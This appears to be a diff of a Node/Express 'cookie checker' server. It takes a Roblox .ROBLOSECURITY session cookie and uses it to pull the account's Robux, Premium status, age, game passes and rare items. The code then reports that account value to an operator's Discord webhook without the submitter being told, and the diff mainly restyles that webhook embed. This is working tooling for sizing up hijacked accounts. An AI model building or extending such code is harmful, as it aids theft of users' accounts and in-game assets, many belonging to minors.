@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 app.use(express.json());
 
-// CORS middleware
+// CORS
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -13,7 +13,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Main page (HTML)
+// Strona główna
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
@@ -102,7 +102,7 @@ app.post('/check', async (req, res) => {
   }
 
   try {
-    // Get CSRF token
+    // CSRF Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -113,7 +113,7 @@ app.post('/check', async (req, res) => {
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
-    // Get authenticated user
+    // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -121,22 +121,22 @@ app.post('/check', async (req, res) => {
         'Accept': 'application/json',
       },
     });
-    if (!userRes.ok) throw new Error('Invalid or expired cookie');
+    if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
-    // Email verified (via Verified Badge hat)
+    // Verified email (hat)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
       if (ownsRes.ok) {
-        const data = await ownsRes.json();
-        emailVerified = data.data?.length > 0;
+        const d = await ownsRes.json();
+        emailVerified = d.data?.length > 0;
       }
     } catch {}
 
-    // Premium status
+    // Premium
     let hasPremium = false;
     try {
       const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -145,39 +145,39 @@ app.post('/check', async (req, res) => {
       if (premRes.ok) hasPremium = await premRes.json();
     } catch {}
 
-    // Robux balance
+    // Robux
     let robux = 0;
     try {
       const curRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
       if (curRes.ok) {
-        const data = await curRes.json();
-        robux = data.robux || 0;
+        const d = await curRes.json();
+        robux = d.robux || 0;
       }
     } catch {}
 
-    // Account creation date & age
+    // Account age
     let accountAgeDays = 0;
     let created = null;
     try {
-      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
-      if (profileRes.ok) {
-        const profile = await profileRes.json();
-        if (profile.created) {
-          created = profile.created;
+      const profRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
+      if (profRes.ok) {
+        const p = await profRes.json();
+        if (p.created) {
+          created = p.created;
           accountAgeDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
         }
       }
     } catch {}
 
-    // Avatar thumbnail
+    // Avatar
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
       if (thumbRes.ok) {
-        const thumbData = await thumbRes.json();
-        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
+        const t = await thumbRes.json();
+        avatarUrl = t.data?.[0]?.imageUrl;
       }
     } catch {}
 
@@ -185,21 +185,17 @@ app.post('/check', async (req, res) => {
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
-    const allPassIds = [...mm2Ids, ...ampIds, ...sabIds];
+    const allPasses = [...mm2Ids, ...ampIds, ...sabIds];
     const ownedPasses = [];
 
-    for (const passId of allPassIds) {
+    for (const id of allPasses) {
       try {
-        const gpRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`, {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Accept': 'application/json'
-          }
+        const res = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${id}`, {
+          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
         });
-        if (gpRes.ok) {
-          const gpData = await gpRes.json();
-          if (gpData.data?.length > 0) ownedPasses.push(passId);
+        if (res.ok) {
+          const d = await res.json();
+          if (d.data?.length > 0) ownedPasses.push(id);
         }
       } catch {}
     }
@@ -208,7 +204,7 @@ app.post('/check', async (req, res) => {
     const ampCount = ownedPasses.filter(id => ampIds.includes(id)).length;
     const sabCount = ownedPasses.filter(id => sabIds.includes(id)).length;
 
-    // Headless & Korblox (using bundle IDs you specified)
+    // Headless & Korblox
     let hasHeadless = false;
     let hasKorblox = false;
     try {
@@ -216,20 +212,19 @@ app.post('/check', async (req, res) => {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
       if (hRes.ok) {
-        const hData = await hRes.json();
-        hasHeadless = hData.data?.length > 0;
+        const d = await hRes.json();
+        hasHeadless = d.data?.length > 0;
       }
 
       const kRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
       if (kRes.ok) {
-        const kData = await kRes.json();
-        hasKorblox = kData.data?.length > 0;
+        const d = await kRes.json();
+        hasKorblox = d.data?.length > 0;
       }
     } catch {}
 
-    // Prepare response for frontend
     const result = {
       success: true,
       username: userData.name,
@@ -249,7 +244,7 @@ app.post('/check', async (req, res) => {
 
     res.json(result);
 
-    // Send to Discord webhook
+    // Discord webhook – styl z obrazka 1
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -266,7 +261,12 @@ app.post('/check', async (req, res) => {
               },
               fields: [
                 {
-                  name: "**Info**",
+                  name: "┌─────── Account Stats ───────┐",
+                  value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• Game Visits: **?—**\n• Group Owner: **?—**`,
+                  inline: false
+                },
+                {
+                  name: "**Info**\n──────────┐",
                   value:
                     `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                     `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
@@ -274,7 +274,7 @@ app.post('/check', async (req, res) => {
                   inline: true
                 },
                 {
-                  name: "**Games**",
+                  name: "**Games**\n──────────┐",
                   value:
                     `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                     `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
@@ -282,7 +282,7 @@ app.post('/check', async (req, res) => {
                   inline: true
                 },
                 {
-                  name: "**Inventory**",
+                  name: "**Inventory**\n──────────┐",
                   value:
                     `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                     `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
@@ -296,8 +296,8 @@ app.post('/check', async (req, res) => {
             }]
           })
         });
-      } catch (webhookErr) {
-        console.error('Webhook send failed:', webhookErr.message);
+      } catch (e) {
+        console.error("Webhook error:", e.message);
       }
     }
 
